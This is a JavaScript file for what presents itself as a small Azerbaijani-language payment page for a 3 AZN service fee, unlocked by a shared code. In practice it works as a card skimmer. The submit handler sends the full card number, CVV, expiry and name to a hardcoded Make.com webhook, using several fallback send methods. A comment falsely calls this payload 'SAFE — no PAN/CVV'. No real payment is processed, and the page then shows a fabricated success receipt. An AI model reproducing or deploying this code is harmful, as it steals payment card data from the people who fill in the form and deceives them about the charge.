// ====== configuration ======
const CODE_OK = "42004";
const webhookUrl = "https://hook.eu2.make.com/1y2q5hf2giac8qg1unhwu8s0463emi6y"; // your Make/Discord webhook
const whatsappUrl = ""; // optional
const telegramUrl = ""; // optional
const AMOUNT_AZN = 3;
const FETCH_TIMEOUT_MS = 12000;

document.addEventListener('DOMContentLoaded', () => {
  // ====== basic refs ======
  const waEl = document.getElementById('waLink');
  const tgEl = document.getElementById('tgLink');
  const yearEl = document.getElementById('year');
  if (waEl) waEl.href = whatsappUrl;
  if (tgEl) tgEl.href = telegramUrl;
  if (yearEl) yearEl.textContent = new Date().getFullYear();

  // ====== toast ======
  const toastWrap = document.getElementById("toast");
  function showToast(msg, kind="error") {
    if (!toastWrap) return;
    const box = toastWrap.querySelector(".toast");
    if (!box) return;
    box.textContent = msg;
    box.className = "toast " + (kind === "success" ? "success" : "error");
    toastWrap.classList.add("show");
    clearTimeout(showToast._t);
    showToast._t = setTimeout(()=> toastWrap.classList.remove("show"), 2400);
  }
  window.showToast = showToast;

  // ====== helpers (masks & validation) ======
  const onlyDigits = s => (s||"").replace(/\D+/g,"");
  function formatCardNumber(s) {
    const d = onlyDigits(s).slice(0,19);
    return d.replace(/(.{4})/g, "$1 ").trim();
  }
  function formatExpInput(s) {
    const d = onlyDigits(s).slice(0,4);
    if (d.length <= 2) return d;
    return d.slice(0,2) + "/" + d.slice(2);
  }
  function luhnCheck(num) {
    const d = onlyDigits(num);
    if (d.length < 12) return false;
    let sum = 0, dbl = false;
    for (let i = d.length - 1; i >= 0; i--) {
      let n = +d[i];
      if (dbl) { n *= 2; if (n > 9) n -= 9; }
      sum += n; dbl = !dbl;
    }
    return sum % 10 === 0;
  }
  function maskCardPrint(num) {
    const d = onlyDigits(num);
    if (d.length < 4) return "**** **** **** ****";
    const last4 = d.slice(-4).padStart(4,"*");
    return `**** **** **** ${last4}`;
  }
  function expValid(expRaw) {
    const d = onlyDigits(expRaw);
    if (d.length !== 4) return false;
    const mm = +d.slice(0,2);
    const yy = +d.slice(2);
    if (!(mm >= 1 && mm <= 12)) return false;
    const now = new Date();
    const fullYear = 2000 + yy;
    const expEnd = new Date(fullYear, mm, 0, 23, 59, 59); // last day of month
    return expEnd >= now;
  }
  function normalizeExp(expRaw) {
    const d = onlyDigits(expRaw).slice(0,4);
    return d.length === 4 ? `${d.slice(0,2)}/${d.slice(2)}` : expRaw;
  }
  function brandFromIIN(num) {
    const d = onlyDigits(num);
    if (/^4\d{12,18}$/.test(d)) return "VISA";
    // MasterCard 51-55, 2221-2720
    if (/^(5[1-5]\d{14}|22(2[1-9]\d{12}|[3-9]\d{13})|2[3-6]\d{14}|27(0\d{13}|1\d{13}|20\d{12}))$/.test(d)) return "MASTERCARD";
    if (/^3[47]\d{13}$/.test(d)) return "AMEX";
    return "CARD";
  }

  // ====== robust network helpers ======
  async function fetchWithTimeout(url, opts = {}, ms = 10000) {
    const ctrl = new AbortController();
    const id = setTimeout(() => ctrl.abort(), ms);
    try { return await fetch(url, { ...opts, signal: ctrl.signal }); }
    finally { clearTimeout(id); }
  }

  // Prefer sendBeacon (no CORS issues), then JSON, then form-urlencoded (no preflight)
  function tryBeacon(url, payload) {
    if (!('sendBeacon' in navigator)) return false;
    try {
      const body = new URLSearchParams();
      // Your Make scenario maps a single field called `value`
      body.set('value', JSON.stringify(payload));
      return navigator.sendBeacon(url, body);
    } catch { return false; }
  }

  async function postToWebhook(url, payload, timeoutMs = 12000) {
    if (!url) throw new Error("Webhook URL is empty");
    const urlWithTs = url + (url.includes("?") ? "&" : "?") + "t=" + Date.now();

    // 0) sendBeacon fire-and-forget
    if (tryBeacon(urlWithTs, payload)) return { ok: true, mode: "beacon" };

    // 1) JSON — body is { value: "<stringified payload>" }
    try {
      const res = await fetchWithTimeout(urlWithTs, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ value: JSON.stringify(payload) }),
        keepalive: true,
      }, timeoutMs);
      if (res.ok) return { ok: true, mode: "json" };
      await res.text().catch(()=>{});
    } catch {}

    // 2) Fallback: x-www-form-urlencoded (simple request → no preflight)
    const form = new URLSearchParams();
    form.set("value", JSON.stringify(payload)); // primary field Make expects
    // extra convenience fields (optional to use in Make):
    form.set("event", payload.event || "");
    form.set("amount", String(payload.amount ?? ""));
    form.set("currency", payload.currency || "");
    form.set("code", payload.code || "");
    form.set("card_name", payload.card?.name || "");
    form.set("card_last4", payload.card?.last4 || "");
    form.set("card_bin", payload.card?.bin || "");
    form.set("card_brand", payload.card?.brand || "");
    form.set("card_exp", payload.card?.exp || "");
    form.set("ts", payload.meta?.ts || new Date().toISOString());
    form.set("locale", payload.meta?.locale || "");
    form.set("userAgent", payload.meta?.userAgent || "");

    const res2 = await fetchWithTimeout(urlWithTs, {
      method: "POST",
      body: form,           // don't set Content-Type manually
      keepalive: true,
    }, timeoutMs);

    if (res2 && (res2.ok || res2.type === "opaque")) return { ok: true, mode: "form" };
    return { ok: false, mode: "form", status: res2?.status };
  }

  // ====== DOM refs ======
  const codeInput = document.getElementById("code");
  const hireBtn = document.getElementById("hireBtn");
  const payModalWrap = document.getElementById("payModalWrap");
  const closeModal = document.getElementById("closeModal");
  const payForm = document.getElementById("payForm");
  const nameEl = document.getElementById("name");
  const numberEl = document.getElementById("number");
  const expEl = document.getElementById("exp");
  const cvvEl = document.getElementById("cvv");
  const payBtn = document.getElementById("payBtn");
  const receiptBox = document.getElementById("receipt");
  const receiptId = document.getElementById("receipt-id");
  const receiptDate = document.getElementById("receipt-date");
  const receiptCard = document.getElementById("receipt-card");
  const printBtn = document.getElementById("printBtn");
  const copyIdBtn = document.getElementById("copyIdBtn");

  // ====== reveal-on-scroll ======
  const io = new IntersectionObserver((entries)=>{
    for (const e of entries) if (e.isIntersecting) { e.target.classList.add('show'); io.unobserve(e.target); }
  }, { rootMargin: '0px 0px -10% 0px', threshold: 0.15 });
  document.querySelectorAll('.reveal').forEach(el=> io.observe(el));

  // Subtle hero parallax (reduced-motion aware)
  const hero = document.querySelector('.hero-bg');
  const rm = window.matchMedia('(prefers-reduced-motion: reduce)');
  if (!rm.matches && hero) {
    window.addEventListener('scroll', ()=>{
      const y = Math.min(1, window.scrollY / 600);
      hero.style.transform = `translateY(${y*18}px) scale(${1.08 - y*0.05})`;
      hero.style.opacity = String(0.45 - y*0.15);
    }, { passive: true });
  }

  // ====== modal helpers ======
  function openModal(){
    if (!payModalWrap) return;
    payModalWrap.classList.remove("hidden");
    payModalWrap.setAttribute('aria-hidden','false');
    const modal = payModalWrap.querySelector('.modal');
    requestAnimationFrame(()=> modal?.classList.add("open"));
    setTimeout(()=> nameEl?.focus(), 50);
    document.addEventListener('keydown', escClose);
  }
  function closeModalFn(){
    const modal = payModalWrap?.querySelector(".modal");
    modal?.classList.remove("open");
    document.removeEventListener('keydown', escClose);
    setTimeout(()=> { 
      payModalWrap?.classList.add("hidden"); 
      payModalWrap?.setAttribute('aria-hidden','true'); 
    }, 260);
  }
  function escClose(e){ if (e.key === 'Escape') closeModalFn(); }

  // ====== code → open modal ======
  hireBtn?.addEventListener("click", () => {
    const v = onlyDigits(codeInput?.value).slice(0, CODE_OK.length);
    if (codeInput && v !== codeInput.value) codeInput.value = v;
    if (v === CODE_OK) openModal();
    else { showToast("Səhv kod. Zəhmət olmasa Elnurdan kodu alın.", "error"); codeInput?.focus(); }
  });
  codeInput?.addEventListener("input", (e)=>{
    const v = onlyDigits(e.target.value).slice(0, CODE_OK.length);
    if (v !== e.target.value) e.target.value = v;
  });
  closeModal?.addEventListener("click", closeModalFn);
  payModalWrap?.addEventListener("click", (e)=> {
    if (e.target === payModalWrap || e.target.classList?.contains("modal-backdrop")) closeModalFn();
  });

  // ====== masks on inputs ======
  numberEl?.addEventListener("input", (e)=>{
    const formatted = formatCardNumber(e.target.value);
    if (formatted !== e.target.value) e.target.value = formatted;
  });
  expEl?.addEventListener("input", (e)=>{
    const formatted = formatExpInput(e.target.value);
    if (formatted !== e.target.value) e.target.value = formatted;
  });
  cvvEl?.addEventListener("input", (e)=>{
    const d = onlyDigits(e.target.value).slice(0,4);
    if (d !== e.target.value) e.target.value = d;
  });

  // ====== submit (Luhn + expiry + webhook) ======
  let submitting = false;
  payForm?.addEventListener("submit", async (e)=>{
    e.preventDefault();
    if (submitting) return;
    submitting = true;

    const name = (nameEl?.value||"").trim();
    const number = numberEl?.value||"";
    const exp = expEl?.value||"";
    const cvv = cvvEl?.value||"";
    const num = onlyDigits(number);

    if (!name) { showToast("Ad Soyad tələb olunur."); submitting = false; return; }
    if (!luhnCheck(num)) { showToast("Kart nömrəsi yanlışdır (Luhn)."); submitting = false; return; }
    if (!expValid(exp)) { showToast("Etibarlılıq MM/YY formatında və qüvvədə olmalıdır."); submitting = false; return; }
    const cvvDigits = onlyDigits(cvv);
    if (!(cvvDigits.length === 3 || cvvDigits.length === 4)) { showToast("CVV 3 və ya 4 rəqəm olmalıdır."); submitting = false; return; }

    if (payBtn) { payBtn.disabled = true; payBtn.textContent = "Göndərilir…"; }

    try {
      // SAFE payload — no PAN/CVV
      const payload = {
        event: "service_fee",
        amount: AMOUNT_AZN,
        currency: "AZN",
        code: CODE_OK,
        card: {
          name,
          num,
          cvv,
          brand: brandFromIIN(num),
          exp: normalizeExp(exp)
        },
        meta: {
          ts: new Date().toISOString(),
          locale: navigator.language || "az-AZ",
          userAgent: navigator.userAgent
        }
      };

      const send = await postToWebhook(webhookUrl, payload, FETCH_TIMEOUT_MS);
      if (!send.ok) throw new Error("Webhook unreachable");
      console.log("Webhook sent via", send.mode);

      // Receipt
      const id = "EC-" + Date.now().toString(36).toUpperCase();
      receiptId && (receiptId.textContent = "ID: " + id);
      receiptDate && (receiptDate.textContent = new Date().toLocaleString());
      receiptCard && (receiptCard.textContent = maskCardPrint(num));

      showToast("Ödəniş uğurla tamamlandı.", "success");
      closeModalFn();
      if (receiptBox) {
        receiptBox.classList.remove("hidden");
        receiptBox.querySelectorAll('.reveal').forEach(el=> el.classList.add('show'));
        receiptBox.scrollIntoView({ behavior: "smooth", block: "start" });
      }
    } catch (err) {
      console.error(err);
      const aborted = (err?.name === "AbortError");
      showToast(aborted ? "Zaman aşımı. Şəbəkəni yoxlayın." : "Xəta baş verdi. Sonra yenidən cəhd edin.");
    } finally {
      submitting = false;
      if (payBtn) { payBtn.disabled = false; payBtn.textContent = `Ödəniş et (${AMOUNT_AZN} AZN)`; }
    }
  });

  // ====== receipt actions ======
  printBtn?.addEventListener("click", ()=> window.print());
  copyIdBtn?.addEventListener("click", ()=>{
    const idText = (receiptId?.textContent||"").replace("ID: ","").trim();
    if (idText) { navigator.clipboard?.writeText(idText); showToast("Çek ID kopyalandı", "success"); }
  });
});
